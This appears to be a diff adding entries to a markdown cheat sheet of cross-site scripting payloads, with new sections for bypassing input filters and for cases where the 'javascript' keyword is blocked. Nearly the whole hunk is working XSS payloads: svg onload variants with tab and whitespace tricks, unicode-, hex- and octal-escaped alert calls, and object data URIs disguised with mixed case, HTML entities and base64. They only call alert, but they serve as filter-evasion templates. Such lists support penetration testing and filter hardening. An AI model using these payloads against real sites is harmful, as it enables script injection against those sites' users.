@@ -74,6 +74,35 @@ XSS payloads
 %uff1cscript%uff1eprompt("!XSS!");%uff1c/script%uff1e&
 %253Cscript%253Eprint()%253C%252Fscript%253E
 %253Cimg%2520src%253Dq%2520onError%253Dalert(%2522XSS%2522)%253B%2520%252F%253E
+
+<!-- Bypassing First Filter -->
+<svg/onload=alert(1)>
+<svg//////onload=alert(1)>
+<svg id=x;onload=alert(1)>
+<svg id=`x`onload=alert(1)>
+<svg%09onload=alert(1)>
+<svg onload%09=alert(1)>
+<svg%09onload%20=alert(1)>
+<svg onload%09%20%28%2C%3B=alert(1)>
+<svg onload+0B=alert(1)>
+<script>\u0061lert(1)</script>
+<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
+<img src=x onerror="\u0061lert"/>
+<img src=x onerror="eval('\141lert(1)')"/>
+<img src=x onerror="eval('\x61lert(1)')"/>
+
+ <!-- Javascript Keyword is blocked-->
+<object data="JaVaScRiPt:alert(1)">
+<object data="javascript&colon;alert(1)">
+<object data="java  
+    script:alert(1)">
+<object data="javascript&#x003A;alert(1)">
+<object data="javascript&#58;alert(1)">
+<object data="&#x6A;avascript;alert(1)">
+<object data="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;74;&#x3A;alert(1)">
+<object data="data:text/html,<script>alert(1)</script>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+
 ```
 
 ### N.B.
